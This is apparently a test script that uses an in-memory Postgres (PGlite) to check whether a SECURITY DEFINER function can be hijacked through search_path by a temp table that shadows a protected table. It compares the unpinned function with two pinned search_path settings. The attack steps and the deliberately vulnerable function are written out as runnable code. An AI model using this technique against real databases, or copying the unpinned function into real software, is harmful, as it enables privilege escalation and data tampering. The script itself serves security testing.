import { PGlite } from '@electric-sql/pglite';

const db = new PGlite();
await db.exec(`select version()`).catch(()=>{});
console.log('version:', (await db.query('select version()')).rows[0].version);

await db.exec(`
  create role authenticated nologin;
  create table secrets (v text);
  insert into secrets values ('REAL');
  alter table secrets enable row level security;
  alter table secrets force row level security;
  create function read_secret() returns text
    language sql security definer stable as $$ select v from secrets limit 1 $$;
  grant execute on function read_secret() to authenticated;
  revoke create on schema public from public;
  revoke create on schema public from authenticated;
`);

// does authenticated hold CREATE anywhere?
const wr = await db.query(`select n.nspname as schema from pg_catalog.pg_namespace n
   where n.nspname not like 'pg\_%' and n.nspname <> 'information_schema'
     and pg_catalog.has_schema_privilege('authenticated', n.oid, 'CREATE')`);
console.log('writable schemas for authenticated:', wr.rows.map(r=>r.schema));
console.log('TEMP on db:', (await db.query(`select has_database_privilege('authenticated', current_database(), 'TEMP') as t`)).rows[0].t);

async function attempt(label) {
  await db.exec('begin');
  try {
    await db.exec(`set local role authenticated`);
    await db.exec(`create temp table secrets (v text)`);
    await db.exec(`insert into secrets values ('ATTACKER')`);
    const r = await db.query(`select read_secret() as v`);
    console.log(label, '=>', r.rows[0].v);
  } catch (e) {
    console.log(label, 'ERR', e.message);
  } finally {
    await db.exec('rollback');
  }
}

await attempt('unpinned                                   ');
await db.exec(`alter function read_secret() set search_path = pg_catalog, public`);
await attempt('pinned pg_catalog, public                  ');
await db.exec(`alter function read_secret() set search_path = pg_catalog, public, pg_temp`);
await attempt('pinned pg_catalog, public, pg_temp         ');
